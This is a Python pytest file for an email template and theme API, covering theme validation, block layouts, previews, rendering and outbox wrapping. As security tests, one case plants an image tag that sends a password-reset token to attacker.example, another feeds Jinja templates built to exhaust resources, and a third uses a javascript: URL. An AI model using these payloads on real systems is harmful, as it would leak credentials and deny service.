"""Email theme API, block-document round trip, draft preview, catalog, render_code,
and the outbox safety net (#1349). Postgres via tests/_pg_fixture.py.

AC ids: documentation/plans/email/email-layout-28sep-acceptance-criteria.md.
"""
from __future__ import annotations

import uuid
from unittest.mock import patch

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

from app.models.email_template import EmailTemplate
from app.models.user import SystemSetting
from app.services.email_layout import has_layout
from tests._pg_fixture import unique_code


@pytest.fixture
def db():
    # Routes under test commit; create_savepoint keeps each commit inside the outer
    # transaction the fixture rolls back, so nothing leaks to later test files.
    from sqlalchemy.orm import Session

    from app.database import engine

    connection = engine.connect()
    transaction = connection.begin()
    session = Session(bind=connection, join_transaction_mode="create_savepoint")
    try:
        yield session
    finally:
        session.close()
        transaction.rollback()
        connection.close()


def _settings(db) -> SystemSetting:
    row = db.query(SystemSetting).first()
    if row is None:
        row = SystemSetting(id=str(uuid.uuid4()), name="Acme Trading")
        db.add(row)
        db.flush()
    return row


def _client(db, allowed: set[str]) -> TestClient:
    from app.api.v1.system import email_templates
    from app.database import get_db
    from app.dependencies import get_current_user

    app = FastAPI()
    app.include_router(email_templates.router, prefix="/api/v1/system")
    app.dependency_overrides[get_db] = lambda: db
    app.dependency_overrides[get_current_user] = lambda: {"id": str(uuid.uuid4()), "name": "Admin"}

    def _check(self, user_id, slug):
        return slug in allowed

    p = patch(
        "app.services.user_service.UserPermissionService.check_user_has_permission",
        _check,
    )
    p.start()
    client = TestClient(app)
    client._perm_patch = p  # type: ignore[attr-defined]
    return client


VIEW = "email_templates.templates.view"
EDIT = "email_templates.templates.edit"
ADD = "email_templates.templates.add"


@pytest.fixture
def stop_patches():
    started: list = []
    yield started
    # Reverse order: patches stacked on the same attribute must unwind last-in first-out,
    # or stopping the first one restores the ORIGINAL and stopping the second then puts
    # the first test's fake permission check back for every later test file.
    for c in reversed(started):
        c._perm_patch.stop()


def _c(db, stop_patches, allowed):
    c = _client(db, allowed)
    stop_patches.append(c)
    return c


# --------------------------------------------------------------------------- theme
def test_get_theme_returns_theme_defaults_fonts(db, stop_patches):  # AC-EM020, 022
    s = _settings(db)
    s.email_theme = None
    s.support_email = "help@acme.example"
    db.flush()
    r = _c(db, stop_patches, {VIEW}).get("/api/v1/system/email-theme")
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["theme"]["primary_color"] is None
    assert body["defaults"]["primary_color"] == "#2563EB"
    assert body["defaults"]["help_email"] == "help@acme.example"
    assert body["defaults"]["company_name"] == s.name
    assert {f["value"] for f in body["fonts"]} == {"system", "arial", "helvetica", "verdana", "trebuchet", "georgia"}


def test_put_theme_saves_only_email_theme(db, stop_patches):  # AC-EM021, 024
    s = _settings(db)
    before = (s.name, s.address, s.smtp_host)
    r = _c(db, stop_patches, {VIEW, EDIT}).put(
        "/api/v1/system/email-theme",
        json={"primary_color": "#ff5a00", "button_radius": 16, "font": "arial", "social_links": [{"label": "LinkedIn", "url": "https://linkedin.com/x"}]},
    )
    assert r.status_code == 200, r.text
    db.refresh(s)
    assert s.email_theme["primary_color"] == "#FF5A00"
    assert s.email_theme["button_radius"] == 16
    assert (s.name, s.address, s.smtp_host) == before
    assert r.json()["theme"]["primary_color"] == "#FF5A00"
    assert r.json()["defaults"]["button_color"] in ("#FF5A00", "#2563EB")


@pytest.mark.parametrize("payload", [{"primary_color": "orange"}, {"button_radius": 99}, {"font": "comic"}, {"logo_url": "javascript:x"}])
def test_put_theme_invalid_is_422_and_stores_nothing(db, stop_patches, payload):  # AC-EM021
    s = _settings(db)
    s.email_theme = {"primary_color": "#123456"}
    db.flush()
    r = _c(db, stop_patches, {VIEW, EDIT}).put("/api/v1/system/email-theme", json=payload)
    assert r.status_code == 422
    db.refresh(s)
    assert s.email_theme == {"primary_color": "#123456"}


def test_theme_permissions(db, stop_patches):  # AC-EM090
    _settings(db)
    none = _c(db, stop_patches, set())
    assert none.get("/api/v1/system/email-theme").status_code == 403
    assert none.post("/api/v1/system/email-theme/preview", json={"theme": {}}).status_code == 403
    view_only = _c(db, stop_patches, {VIEW})
    assert view_only.put("/api/v1/system/email-theme", json={}).status_code == 403


def test_theme_preview_uses_unsaved_values(db, stop_patches):  # AC-EM030
    s = _settings(db)
    s.email_theme = {"primary_color": "#123456"}
    db.flush()
    r = _c(db, stop_patches, {VIEW}).post(
        "/api/v1/system/email-theme/preview", json={"theme": {"primary_color": "#ABCDEF", "company_name": "Preview Co"}}
    )
    assert r.status_code == 200, r.text
    out = r.json()
    assert "#ABCDEF" in out["body_html"] and "Preview Co" in out["body_html"]
    assert out["subject"]
    assert has_layout(out["body_html"])
    db.refresh(s)
    assert s.email_theme == {"primary_color": "#123456"}  # preview never saves


def test_theme_preview_invalid_is_422(db, stop_patches):
    _settings(db)
    r = _c(db, stop_patches, {VIEW}).post("/api/v1/system/email-theme/preview", json={"theme": {"primary_color": "nope"}})
    assert r.status_code == 422


# --------------------------------------------------------------- template blocks
DOC = {
    "version": 1,
    "blocks": [
        {"id": "a", "type": "brand_header"},
        {"id": "b", "type": "heading", "text": "Hi {{ recipient.name }}", "align": "left"},
        {"id": "c", "type": "custom_text", "html": "<p>One</p>"},
        {"id": "d", "type": "button", "label": "Go", "url": "https://x.example/1"},
        {"id": "e", "type": "custom_text", "html": "<p>Two</p>"},
        {"id": "f", "type": "footer", "note": None},
    ],
}


def test_create_with_blocks_without_body_html_round_trips_order(db, stop_patches):  # AC-EM044, 045
    c = _c(db, stop_patches, {VIEW, ADD, EDIT})
    code = unique_code("tpl")
    r = c.post("/api/v1/system/email-templates", json={"code": code, "name": "T", "subject": "S", "preheader": "Pre", "layout_json": DOC})
    assert r.status_code == 201, r.text
    created = r.json()
    assert created["preheader"] == "Pre"
    assert [b["id"] for b in created["layout_json"]["blocks"]] == list("abcdef")
    assert created["body_html"] == "<p>One</p>\n<p>Two</p>"
    assert created["is_system"] is False

    reordered = {"version": 1, "blocks": [DOC["blocks"][i] for i in (0, 3, 1, 2, 4, 5)]}
    r = c.put(f"/api/v1/system/email-templates/{created['id']}", json={"layout_json": reordered})
    assert r.status_code == 200, r.text
    got = c.get(f"/api/v1/system/email-templates/{created['id']}").json()
    assert [b["id"] for b in got["layout_json"]["blocks"]] == ["a", "d", "b", "c", "e", "f"]

    prev = c.post(f"/api/v1/system/email-templates/{created['id']}/preview", json={}).json()
    html = prev["body_html"]
    assert html.index("em-btn-link") < html.index("Hi Sample Recipient") < html.index("One")


def test_create_legacy_template_still_requires_body(db, stop_patches):
    c = _c(db, stop_patches, {VIEW, ADD})
    r = c.post("/api/v1/system/email-templates", json={"code": unique_code("tpl"), "name": "T", "subject": "S"})
    assert r.status_code == 422


def test_invalid_block_document_is_422(db, stop_patches):
    c = _c(db, stop_patches, {VIEW, ADD})
    r = c.post(
        "/api/v1/system/email-templates",
        json={"code": unique_code("tpl"), "name": "T", "subject": "S", "layout_json": {"version": 1, "blocks": [{"type": "hero"}]}},
    )
    assert r.status_code == 422


def test_legacy_template_preview_is_branded(db, stop_patches):  # AC-EM040 (implicit doc)
    row = EmailTemplate(code=unique_code("legacy"), name="L", subject="Hello", body_html="<p>Legacy body</p>")
    db.add(row)
    db.flush()
    c = _c(db, stop_patches, {VIEW})
    got = c.get(f"/api/v1/system/email-templates/{row.id}").json()
    assert got["layout_json"] is None and got["preheader"] is None
    out = c.post(f"/api/v1/system/email-templates/{row.id}/preview", json={}).json()
    assert has_layout(out["body_html"]) and "Legacy body" in out["body_html"]


def test_preview_draft_renders_unsaved_document(db, stop_patches):  # AC-EM031
    c = _c(db, stop_patches, {VIEW, EDIT})
    r = c.post(
        "/api/v1/system/email-templates/preview-draft",
        json={"subject": "Draft {{ recipient.name }}", "preheader": "P", "layout_json": DOC},
    )
    assert r.status_code == 200, r.text
    out = r.json()
    assert out["subject"] == "Draft Sample Recipient"
    assert "Hi Sample Recipient" in out["body_html"]
    assert _c(db, stop_patches, set()).post("/api/v1/system/email-templates/preview-draft", json={"subject": "x"}).status_code == 403
    # B2: rendering caller-supplied Jinja needs edit, like saving a template does.
    assert _c(db, stop_patches, {VIEW}).post("/api/v1/system/email-templates/preview-draft", json={"subject": "x"}).status_code == 403


def test_preview_draft_uses_system_sample_context(db, stop_patches):
    from app.services.email_system_templates import SYSTEM_TEMPLATES

    t = SYSTEM_TEMPLATES["auth_password_reset"]
    r = _c(db, stop_patches, {VIEW, EDIT}).post(
        "/api/v1/system/email-templates/preview-draft",
        json={"subject": t.subject, "layout_json": t.document(), "code": "auth_password_reset"},
    )
    assert "change-password?token=sample" in r.json()["body_html"]


def test_catalog_has_handover_and_undo_and_per_code_variables(db, stop_patches):  # AC-EM046
    c = _c(db, stop_patches, {VIEW})
    keys = {v["key"] for v in c.get("/api/v1/system/email-templates/variables/catalog").json()["variables"]}
    for k in ("handover.headline", "handover.lines", "handover.link", "undo.headline", "undo.so_number", "undo.lines", "undo.link"):
        assert k in keys
    keys_code = {v["key"] for v in c.get("/api/v1/system/email-templates/variables/catalog?code=auth_password_reset").json()["variables"]}
    assert "reset_link" in keys_code


# ----------------------------------------------------------------- render_code
def test_render_code_without_row_uses_builtin(db):  # D4
    from app.services.email_template_service import EmailTemplateService

    db.query(EmailTemplate).filter(EmailTemplate.code == "auth_password_reset").delete()
    db.flush()
    out = EmailTemplateService(db).render_code(
        "auth_password_reset", {"recipient": {"name": "Aina"}, "reset_link": "https://crm.example.com/change-password?token=t1"}
    )
    assert out["subject"] == "Reset your password"
    assert "change-password?token=t1" in out["body_html"]
    assert has_layout(out["body_html"])
    assert "Reset password: https://crm.example.com/change-password?token=t1" in out["body_text"]


def test_render_code_uses_admin_row_and_inactive_falls_back(db):  # AC-EM044, Q4
    from app.services.email_template_service import EmailTemplateService

    db.query(EmailTemplate).filter(EmailTemplate.code == "account_email_changed").delete()
    row = EmailTemplate(
        code="account_email_changed", name="Changed", subject="Custom changed", body_html="",
        layout_json={"version": 1, "blocks": [{"type": "heading", "text": "Admin wording"}]},
    )
    db.add(row)
    db.flush()
    svc = EmailTemplateService(db)
    assert svc.render_code("account_email_changed", {})["subject"] == "Custom changed"
    row.is_active = False
    db.flush()
    assert svc.render_code("account_email_changed", {})["subject"] == "Your sign-in email was updated"


def test_credential_mail_ignores_any_row(db):  # security review B1, PLAN D11
    from app.services.email_template_service import EmailTemplateService

    db.query(EmailTemplate).filter(EmailTemplate.code == "auth_password_reset").delete()
    db.add(EmailTemplate(
        code="auth_password_reset", name="Evil", subject="Evil", body_html="",
        layout_json={"version": 1, "blocks": [{"type": "custom_text", "html": '<img src="https://attacker.example/p?t={{ reset_link }}">'}]},
    ))
    db.flush()
    out = EmailTemplateService(db).render_code("auth_password_reset", {"reset_link": "https://crm.example.com/change-password?token=SECRET"})
    assert out["subject"] == "Reset your password"
    assert "attacker.example" not in out["body_html"]


@pytest.mark.parametrize("code", ["auth_password_reset", "user_invitation", "onboarding_intake_link", "purchase_request_approval_link"])
def test_api_refuses_credential_codes(db, stop_patches, code):  # B1
    c = _c(db, stop_patches, {VIEW, ADD, EDIT})
    r = c.post("/api/v1/system/email-templates", json={"code": code, "name": "x", "subject": "x", "body_html": "<p>x</p>"})
    assert r.status_code == 422
    row = EmailTemplate(code=unique_code("ok"), name="x", subject="x", body_html="<p>x</p>")
    db.add(row)
    db.flush()
    r = c.put(f"/api/v1/system/email-templates/{row.id}", json={"code": code})
    assert r.status_code == 422


def test_render_code_injects_company_name(db):
    from app.services.email_template_service import EmailTemplateService

    s = _settings(db)
    s.email_theme = {"company_name": "Brand X"}
    db.flush()
    out = EmailTemplateService(db).render_code("user_invitation", {"recipient": {"name": "A"}, "invite_link": "https://x/1"})
    assert out["subject"] == "You're invited to join Brand X"


def test_render_code_unknown_code_raises(db):
    from app.services.email_template_service import EmailTemplateService

    with pytest.raises(KeyError):
        EmailTemplateService(db).render_code("no_such_code", {})


def test_broken_admin_template_renders_safe_layout(db):  # AC-EM080, 083
    from app.services.email_template_service import EmailTemplateService

    row = EmailTemplate(code=unique_code("broken"), name="B", subject="Broken {{ x }}", body_html="<p>{% if %}</p>", body_text=None)
    db.add(row)
    db.flush()
    out = EmailTemplateService(db).render(row, {"x": "one"})
    for part in out.values():
        assert "[template-error" not in part
    assert out["subject"] == "Broken one"
    assert has_layout(out["body_html"])


# ------------------------------------------------------------- outbox safety net
def test_outbox_enqueue_wraps_unlayouted_body(db):  # AC-EM085, 076
    from app.models.email_outbox import EmailOutbox
    from app.services.email_outbox_service import enqueue

    oid = enqueue(db, event_key="notification_delivery", to="a@example.com", subject="Import finished", body_text="Rows: 12\n\nAll good.", body_html=None)
    row = db.query(EmailOutbox).filter(EmailOutbox.id == oid).one()
    assert has_layout(row.body_html)
    assert "Rows: 12" in row.body_html and "Import finished" in row.body_html
    assert row.body_text.startswith("Rows: 12")

    oid2 = enqueue(db, event_key="notification_delivery", to="a@example.com", subject="S", body_text="t", body_html="<p>Old <b>html</b></p>")
    row2 = db.query(EmailOutbox).filter(EmailOutbox.id == oid2).one()
    assert has_layout(row2.body_html) and "Old <b>html</b>" in row2.body_html


def test_outbox_enqueue_keeps_layouted_body_and_opt_out(db):  # AC-EM085, 077
    from app.models.email_outbox import EmailOutbox
    from app.services.email_outbox_service import enqueue
    from app.services.email_template_service import EmailTemplateService

    rendered = EmailTemplateService(db).render_code("notification_generic", {"title": "T", "body": "B"})
    oid = enqueue(db, event_key="notification_delivery", to="a@example.com", subject="T", body_text=rendered["body_text"], body_html=rendered["body_html"])
    assert db.query(EmailOutbox).filter(EmailOutbox.id == oid).one().body_html == rendered["body_html"]

    oid2 = enqueue(db, event_key="notification_delivery", to="a@example.com", subject="T", body_text="plain only", body_html=None, layout=False)
    assert db.query(EmailOutbox).filter(EmailOutbox.id == oid2).one().body_html is None


def test_outbox_merge_rebuild_is_wrapped(db):  # AC-EM085 (coalesced)
    from app.models.email_outbox import EmailEventConfig, EmailOutbox
    from app.services.email_outbox_service import enqueue_or_merge

    cfg = db.query(EmailEventConfig).filter(EmailEventConfig.event_key == "external_product_attachment").first()
    if cfg is not None:
        cfg.coalesce_window_seconds_override = 60
    db.flush()
    to = f"{unique_code('m').lower()}@example.com"

    def rebuild(meta):
        items = meta.get("items") or []
        return "\n".join(items), "<ul>" + "".join(f"<li>{i}</li>" for i in items) + "</ul>"

    oid, merged = enqueue_or_merge(db, event_key="external_product_attachment", to=to, subject="S", body_text="a", body_html="<ul><li>a</li></ul>", metadata={"items": ["a"]}, coalesce_id="b1", merge_metadata_list_keys=["items"], rebuild_body=rebuild)
    oid2, merged2 = enqueue_or_merge(db, event_key="external_product_attachment", to=to, subject="S", body_text="b", body_html="<ul><li>b</li></ul>", metadata={"items": ["b"]}, coalesce_id="b1", merge_metadata_list_keys=["items"], rebuild_body=rebuild)
    row = db.query(EmailOutbox).filter(EmailOutbox.id == oid2).one()
    assert has_layout(row.body_html)
    if merged2:
        assert oid == oid2 and "<li" in row.body_html and ">b</li>" in row.body_html and ">a</li>" in row.body_html


def test_preview_draft_size_limits(db, stop_patches):  # S2
    c = _c(db, stop_patches, {VIEW, EDIT})
    assert c.post("/api/v1/system/email-templates/preview-draft", json={"subject": "x", "body_html": "a" * 200_001}).status_code == 422
    assert c.post("/api/v1/system/email-templates/preview-draft", json={"subject": "x", "context": {"k": "a" * 100_001}}).status_code == 422


def test_preview_draft_expensive_jinja_is_bounded(db, stop_patches):  # B2
    import time

    c = _c(db, stop_patches, {VIEW, EDIT})
    for heading in (
        "{% for i in range(100000) %}{% for j in range(100000) %}{% endfor %}{% endfor %}",
        "{% for i in range(1000) %}{% for j in range(1000) %}{% for k in range(1000) %}{% endfor %}{% endfor %}{% endfor %}",
        "{{ 'a' * 2000000000 }}",
        "{{ 9 ** 999999 }}",
    ):
        started = time.monotonic()
        r = c.post(
            "/api/v1/system/email-templates/preview-draft",
            json={"subject": "S", "layout_json": {"version": 1, "blocks": [{"type": "heading", "text": heading}]}},
        )
        assert r.status_code == 200
        assert time.monotonic() - started < 6, heading
        assert "[template-error" not in r.json()["body_html"]
